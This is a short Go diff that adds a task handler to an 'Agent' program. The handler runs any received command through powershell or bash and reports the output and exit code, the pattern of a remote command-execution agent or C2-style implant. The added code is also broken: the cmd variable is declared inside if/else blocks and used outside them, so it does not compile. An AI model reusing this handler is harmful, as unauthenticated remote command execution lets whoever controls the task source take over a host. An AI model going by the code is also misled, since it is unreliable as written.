@@ -71,6 +71,33 @@ func (agent *Agent) Register() error {
 	return nil
 }
 
+func (agent *Agent) HandleTask(task Task) (Result, error) {
+	var result Result
+	result.AgentID = agent.LocalIP
+	result.TaskID = task.TaskID
+
+	switch task.Action {
+	case "command":
+		if runtime.GOOS == "windows" {
+			cmd := exec.Command("powershell", "-Command", task.Command)
+		} else {
+			cmd := exec.Command("bash", "-c", task.Command)
+		}
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			result.Result = string(out)
+			result.ReturnCode = cmd.ProcessState.ExitCode()
+		} else {
+			result.Result = string(out)
+			result.ReturnCode = 0
+		}
+	default:
+		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
+	}
+
+	return result, nil
+}
+
 func main(){
 	agent := Agent{
         LocalIP:  getLocalIP(),
